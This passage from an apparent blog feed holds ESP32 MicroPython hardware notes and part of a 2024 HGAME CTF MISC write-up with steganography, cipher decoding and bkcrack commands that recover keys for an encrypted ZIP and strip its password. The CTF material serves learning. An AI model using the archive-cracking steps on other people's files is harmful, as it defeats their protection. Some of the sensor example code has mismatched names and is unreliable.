self.cs.low()</span><br><span class="line">        self.spi.write(self.buffer)</span><br><span class="line">        self.cs.high()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poweron</span>(<span class="params">self</span>):</span><br><span class="line">        self.res.high()</span><br><span class="line">        time.sleep_ms(<span class="number">1</span>)</span><br><span class="line">        self.res.low()</span><br><span class="line">        time.sleep_ms(<span class="number">10</span>)</span><br><span class="line">        self.res.high()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin, SoftI2C</span><br><span class="line"><span class="keyword">import</span> ssd1306</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建i2c对象</span></span><br><span class="line">i2c = SoftI2C(scl=Pin(<span class="number">22</span>), sda=Pin(<span class="number">21</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宽度高度</span></span><br><span class="line">oled_width = <span class="number">128</span></span><br><span class="line">oled_height = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建oled屏幕对象</span></span><br><span class="line">oled = ssd1306.SSD1306_I2C(oled_width, oled_height, i2c) <span class="comment"># 传参 屏幕宽度高度以及i2c对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在指定位置处显示文字</span></span><br><span class="line">oled.text(<span class="string">&#x27;Hello!&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">oled.text(<span class="string">&#x27;Hello, World 2!&#x27;</span>, <span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">oled.text(<span class="string">&#x27;Hello, World 3!&#x27;</span>, <span class="number">0</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">oled.fill() <span class="comment"># 填充颜色（灰度）</span></span><br><span class="line">oled.pixel() <span class="comment"># 在像素位置填充颜色</span></span><br><span class="line">        </span><br><span class="line">oled.show()</span><br></pre></td></tr></table></figure><h2 id="sht3x模块-温度湿度传感器"><a href="#sht3x模块-温度湿度传感器" class="headerlink" title="sht3x模块 | 温度湿度传感器"></a>sht3x模块 | 温度湿度传感器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> utime</span><br><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin</span><br><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> SoftI2C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHT3x_Sensor</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, freq, sdapin, sclpin</span>):</span><br><span class="line">        self.i2c = SoftI2C(sda=sdapin, scl=sclpin)</span><br><span class="line">        addrs = self.i2c.scan()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> addrs:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;no SHT3X found at bus on SDA pin %d SCL pin %d&#x27;</span> % (sdapin, sclpin))</span><br><span class="line">        self.addr = addrs.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_temp_humd</span>(<span class="params">self</span>):</span><br><span class="line">        status = self.i2c.writeto(self.addr, <span class="string">b&#x27;\x24\x00&#x27;</span>)</span><br><span class="line">        <span class="comment"># delay (20 slow)</span></span><br><span class="line">        utime.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># read 6 bytes</span></span><br><span class="line">        databytes = self.i2c.readfrom(self.addr, <span class="number">6</span>)</span><br><span class="line">        dataset = [databytes[<span class="number">0</span>], databytes[<span class="number">1</span>]]</span><br><span class="line">        dataset = [databytes[<span class="number">3</span>], databytes[<span class="number">4</span>]]</span><br><span class="line">        temperature_raw = databytes[<span class="number">0</span>] &lt;&lt; <span class="number">8</span> | databytes[<span class="number">1</span>]</span><br><span class="line">        temperature = (<span class="number">175.0</span> * <span class="built_in">float</span>(temperature_raw) / <span class="number">65535.0</span>) - <span class="number">45</span></span><br><span class="line">        <span class="comment"># fahreheit</span></span><br><span class="line">        <span class="comment"># temperature = (315.0 * float(temperature_raw) / 65535.0) - 49</span></span><br><span class="line">        humidity_raw = databytes[<span class="number">3</span>] &lt;&lt; <span class="number">8</span> | databytes[<span class="number">4</span>]</span><br><span class="line">        humidity = (<span class="number">100.0</span> * <span class="built_in">float</span>(humidity_raw) / <span class="number">65535.0</span>)</span><br><span class="line">        sensor_data = [temperature, humidity]</span><br><span class="line">        <span class="keyword">return</span> sensor_data</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sht3x = sht3x.SHT3X_Sensor(freq=<span class="number">1000</span>,sdapin=Pin(<span class="number">21</span>),sclpin=Pin(<span class="number">22</span>))</span><br><span class="line">temp,humd = sht3x.read_tmp_humd()</span><br></pre></td></tr></table></figure><h2 id="步进电机"><a href="#步进电机" class="headerlink" title="步进电机"></a>步进电机</h2><p><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706871206040-71a9e68e-7bf8-463e-9eae-f1831eb0341e.png" alt="image.png"><br>步进电机原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ABCD为定子，上面绕有线圈，为四相，与之相对应的对面四个定子上面也有线圈，相对应的两个定子之间线圈是相互连接形成一个绕组。</span><br><span class="line"></span><br><span class="line">单四拍模式：</span><br><span class="line"></span><br><span class="line">如当前为初始状态，B相导通，对0的吸引力最大。</span><br><span class="line"></span><br><span class="line">接下来B断开，C导通，1和C相之间夹角最小被吸引过去，被吸引过去之前2和D相之间夹角为1和C相之间夹角的2倍，1被吸引到C以后，2和D之间最近，此时0和A之间的夹角为2和D之间的2倍，</span><br><span class="line"></span><br><span class="line">接下来C断开，D导通，2被吸引到D，此时0距离A最近</span><br><span class="line"></span><br><span class="line">D断开A导通，0被吸引到A相，至此一个周期完成</span><br><span class="line"></span><br><span class="line">双拍工作模式：</span><br><span class="line"></span><br><span class="line">每次给两个线圈通电，通过改变通电的线圈从而使步进电机转动 五线四相步进电机：在双拍工作方式下，线圈的通电方式依次是：AB、BC、CD、DA 即单拍工作方式下，线圈的通电方式依次是：A、B、C、D</span><br><span class="line"></span><br><span class="line">单双拍（八拍工作方式）</span><br><span class="line"></span><br><span class="line">单双拍工作方式就是单拍工作方式和双拍工作方式交替进行。 五线四相步进电机：A、AB、B、BC、C、CD、D、DA；</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = Pin(<span class="number">15</span>, Pin.OUT)</span><br><span class="line">b = Pin(<span class="number">2</span>, Pin.OUT)</span><br><span class="line">c = Pin(<span class="number">4</span>, Pin.OUT)</span><br><span class="line">d = Pin(<span class="number">16</span>, Pin.OUT)</span><br><span class="line"></span><br><span class="line">a.value(<span class="number">0</span>)</span><br><span class="line">b.value(<span class="number">0</span>)</span><br><span class="line">c.value(<span class="number">0</span>)</span><br><span class="line">d.value(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delay_time_ms = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a.value(<span class="number">1</span>)</span><br><span class="line">    b.value(<span class="number">0</span>)</span><br><span class="line">    c.value(<span class="number">0</span>)</span><br><span class="line">    d.value(<span class="number">0</span>)</span><br><span class="line">    time.sleep_ms(delay_time_ms)</span><br><span class="line">    </span><br><span class="line">    a.value(<span class="number">0</span>)</span><br><span class="line">    b.value(<span class="number">1</span>)</span><br><span class="line">    c.value(<span class="number">0</span>)</span><br><span class="line">    d.value(<span class="number">0</span>)</span><br><span class="line">    time.sleep_ms(delay_time_ms)</span><br><span class="line">    </span><br><span class="line">    a.value(<span class="number">0</span>)</span><br><span class="line">    b.value(<span class="number">0</span>)</span><br><span class="line">    c.value(<span class="number">1</span>)</span><br><span class="line">    d.value(<span class="number">0</span>)</span><br><span class="line">    time.sleep_ms(delay_time_ms)</span><br><span class="line">    </span><br><span class="line">    a.value(<span class="number">0</span>)</span><br><span class="line">    b.value(<span class="number">0</span>)</span><br><span class="line">    c.value(<span class="number">0</span>)</span><br><span class="line">    d.value(<span class="number">1</span>)</span><br><span class="line">    time.sleep_ms(delay_time_ms)</span><br></pre></td></tr></table></figure><h2 id="4-4-矩阵键盘"><a href="#4-4-矩阵键盘" class="headerlink" title="4*4 矩阵键盘"></a>4*4 矩阵键盘</h2><p>电路图<br><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706869204218-90b1f47a-777f-4f43-8d4f-87598664d47b.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">row1 = Pin(<span class="number">19</span>, Pin.OUT)</span><br><span class="line">row2 = Pin(<span class="number">18</span>, Pin.OUT)</span><br><span class="line">row3 = Pin(<span class="number">5</span>, Pin.OUT)</span><br><span class="line">row4 = Pin(<span class="number">17</span>, Pin.OUT)</span><br><span class="line">row_list = [row1, row2, row3, row4]</span><br><span class="line"></span><br><span class="line">col1 = Pin(<span class="number">16</span>, Pin.IN, Pin.PULL_DOWN)</span><br><span class="line">col2 = Pin(<span class="number">4</span>, Pin.IN, Pin.PULL_DOWN)</span><br><span class="line">col3 = Pin(<span class="number">2</span>, Pin.IN, Pin.PULL_DOWN)</span><br><span class="line">col4 = Pin(<span class="number">15</span>, Pin.IN, Pin.PULL_DOWN)</span><br><span class="line">col_list = [col1, col2, col3, col4]</span><br><span class="line"></span><br><span class="line">names = [</span><br><span class="line">    [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;A&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;B&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;C&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;*&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;D&quot;</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(row_list):</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> row_list:</span><br><span class="line">            temp.value(<span class="number">0</span>)</span><br><span class="line">        row.value(<span class="number">1</span>)</span><br><span class="line">        time.sleep_ms(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> j, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(col_list):</span><br><span class="line">            <span class="keyword">if</span> col.value() == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;按键: &#123;&#125; 被按下&quot;</span>.<span class="built_in">format</span>(names[i][j]))</span><br><span class="line">        <span class="comment"># print(row1.value(), row2.value(), row3.value(), row4.value())</span></span><br><span class="line">        <span class="comment"># print(col1.value(), col2.value(), col3.value(), col4.value())</span></span><br><span class="line">        <span class="comment"># print(&quot;-&quot; * 30)</span></span><br><span class="line">                </span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><h2 id="PS2遥感（ADC学习）"><a href="#PS2遥感（ADC学习）" class="headerlink" title="PS2遥感（ADC学习）"></a>PS2遥感（ADC学习）</h2><p>ADC协议：模拟数字电路，电压（模数转换）<br>ADC真脚：0，2，4，12，13，15，25，26，27，32，33，34，35，36，39</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin,ADC</span><br><span class="line"></span><br><span class="line">data = ADC(Pin(data))</span><br><span class="line">data.atten(ADC.ATTN_11DB) <span class="comment"># 设置流程</span></span><br><span class="line"><span class="comment"># ADC.ATTN_0DB 1.2V</span></span><br><span class="line"><span class="comment"># ADC.ATTN_2_5DB 1.5V</span></span><br><span class="line"><span class="comment"># ADC.ATTN_6DB 2.0V</span></span><br><span class="line"><span class="comment"># ADC.ATTN_11DB 3.3V</span></span><br><span class="line"></span><br><span class="line">data.read() <span class="comment"># 读取</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin, ADC</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ps2_y = ADC(Pin(<span class="number">33</span>)) <span class="comment"># VR_X</span></span><br><span class="line">ps2_y.atten(ADC.ATTN_11DB)  <span class="comment"># 这里配置测量量程为3.3V</span></span><br><span class="line">ps2_x = ADC(Pin(<span class="number">32</span>)) <span class="comment"># VR_Y</span></span><br><span class="line">ps2_x.atten(ADC.ATTN_11DB)  <span class="comment"># 这里配置测量量程为3.3V</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">btn = Pin(<span class="number">15</span>, Pin.IN) <span class="comment"># MS</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    val_y = ps2_y.read()  <span class="comment"># 0-4095</span></span><br><span class="line">    val_x = ps2_x.read()  <span class="comment"># 0-4095</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x:&#123;&#125; y:&#123;&#125; btn:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(val_x, val_y, btn.value()))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ESP32 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ESP32 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 HGAME MISC WP</title>
      <link href="/2024-HGAME-MISC-WP/"/>
      <url>/2024-HGAME-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><hr><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p><img src="/2024-HGAME-MISC-WP/1707792340730-aeccb068-270c-4431-be49-8c416aaa23bf.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</span><br></pre></td></tr></table></figure><h2 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hint1:6位弱口令</span></span><br><span class="line">steghide extract -sf &#x27;/root/Desktop/secret.jpg&#x27;  -p &#x27;123456&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hint2:《来自星尘》 font字体</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/MY1L/Ctrl/releases/tag/v1-alpha</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CtrlAstr.3.11VF.ttf</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hgame&#123;welc0me!&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024-HGAME-MISC-WP/1706533029378-036300cc-4dc6-4b3c-a87f-6806ea637241.png" alt="image.png"></p><h2 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C &#x27;attachment.zip&#x27; -c &#x27;103223779_p0.jpg&#x27; -P &#x27;src.zip&#x27; -p &#x27;103223779_p0.jpg&#x27; </span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; keys:e423add9 375dcd1c 1bce583e</span></span><br><span class="line"></span><br><span class="line">bkcrack -C &#x27;attachment.zip&#x27; -c &#x27;103223779_p0.jpg&#x27; -k e423add9 375dcd1c 1bce583e -U &#x27;out.zip&#x27; 123456</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">out.zip 中的 photo.txt <span class="built_in">base64</span>解码图片</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hgame&#123;s1mple_attack_for_zip&#125;</span></span><br></pre></td></tr></table></figure><h2 id="希尔希尔希尔"><a href="#希尔希尔希尔" class="headerlink" title="希尔希尔希尔"></a>希尔希尔希尔</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">photo crc 爆破</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[Width]:1394</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[Heught]:1999</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分离出zip</span></span><br><span class="line">binwalk -e secret.png ---run-as=root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">zseteg获得key</span></span><br><span class="line">zsteg secret.png</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt;&gt;KEY:[[8 7][3 8]];A=0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">希尔解密</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DISAPPEARINTHESEAOFBUTTERFLY</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hgame&#123;DISAPPEARINTHESEAOFBUTTERFLY&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><hr><h2 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h2><p>直接导出图片查看即可<br><img src="/2024-HGAME-MISC-WP/1707310506477-f42d26e1-404a-49ff-9497-d6c90c27db51.png" alt="image.png"><br><img src="/2024-HGAME-MISC-WP/1707310760936-29b4dd02-4c8d-4a69-9ee9-f95c48c505c4.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;ek1ng_want_girlfriend_qq_761042182&#125;</span><br></pre></td></tr></table></figure><h2 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h2><p>文件改为.zip打开，media目录下，image1.png与100191209_p0.jpg 进行盲水印解码<br><img src="/2024-HGAME-MISC-WP/1707315708877-d411007f-100b-46e9-85b8-3d3daafb9b31.png" alt="100191209_p0.jpg_Bwm.png"><br>解压secret.zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Dear E-Commerce professional ; This letter was specially</span><br><span class="line">selected to be sent to you . We will comply with all</span><br><span class="line">removal requests ! This mail is being sent in compliance</span><br><span class="line">with Senate bill 1620 ; Title 3 ; Section 308 ! This</span><br><span class="line">is not a get rich scheme ! Why work for somebody else</span><br><span class="line">when you can become rich in 27 MONTHS . Have you ever</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">love convenience ! Well, now is your chance to capitalize</span><br><span class="line">on this . WE will help YOU turn your business into</span><br><span class="line">an E-BUSINESS &amp; SELL MORE . You can begin at absolutely</span><br><span class="line">no cost to you ! But don&#x27;t believe us . Mr Ames of</span><br><span class="line">Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;</span><br><span class="line">. We are licensed to operate in all states . We BESEECH</span><br><span class="line">you - act now . Sign up a friend and you&#x27;ll get a discount</span><br><span class="line">of 50% ! Thank-you for your serious consideration of</span><br><span class="line">our offer .</span><br><span class="line"></span><br><span class="line"># spammimic</span><br><span class="line">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</span><br><span class="line"></span><br><span class="line"># ROT8000</span><br><span class="line">hgame&#123;0k_you_s0lve_al1_th3_secr3t&#125;</span><br></pre></td></tr></table></figure><h2 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h2><p>频谱图 -&gt; 频谱图设置频率调高至20000<br><img src="/2024-HGAME-MISC-WP/1707310671645-54f064bc-4ee3-42c5-ad9c-d20c07af1bfa.png" alt="image.png"><br>得出的频谱图翻转<br><img src="/2024-HGAME-MISC-WP/1707310835733-cd955a3b-3314-4f9a-9c72-0eda69ad7cfb.png" alt="download.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY: 5H8w1nlWCX3hQLG</span><br></pre></td></tr></table></figure><p>DeepSound<br><img src="/2024-HGAME-MISC-WP/1707310910714-7b920731-85ee-44cc-933d-cb8dacf8902b.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">gif = Image.<span class="built_in">open</span>(<span class="string">&#x27;龙之舞.gif&#x27;</span>)</span><br><span class="line">qrcode_size = <span class="number">162</span></span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (qrcode_size * <span class="number">2</span>, qrcode_size * <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(gif.n_frames):</span><br><span class="line">    gif.seek(i)</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">0</span> <span class="keyword">and</span> (gif.getpixel((gif.size[<span class="number">0</span>] - qrcode_size, gif.size[<span class="number">1</span>] - qrcode_size)) != (<span class="number">0</span>, <span class="number">180</span>, <span class="number">0</span>)):</span><br><span class="line">        crop = gif.crop((gif.size[<span class="number">0</span>] - qrcode_size, gif.size[<span class="number">1</span>] - qrcode_size, gif.size[<span class="number">0</span>], gif.size[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">54</span>:</span><br><span class="line">            out.paste(crop, (<span class="number">0</span>, <span class="number">0</span>, qrcode_size, qrcode_size))</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">120</span>:</span><br><span class="line">            out.paste(crop, (<span class="number">0</span>, qrcode_size, qrcode_size, qrcode_size * <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">152</span>:</span><br><span class="line">            out.paste(crop, (qrcode_size, <span class="number">0</span>, qrcode_size * <span class="number">2</span>, qrcode_size))</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">231</span>:</span><br><span class="line">            out.paste(crop, (qrcode_size, qrcode_size, qrcode_size * <span class="number">2</span>, qrcode_size * <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">out.save(<span class="string">&#x27;qrcode.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img 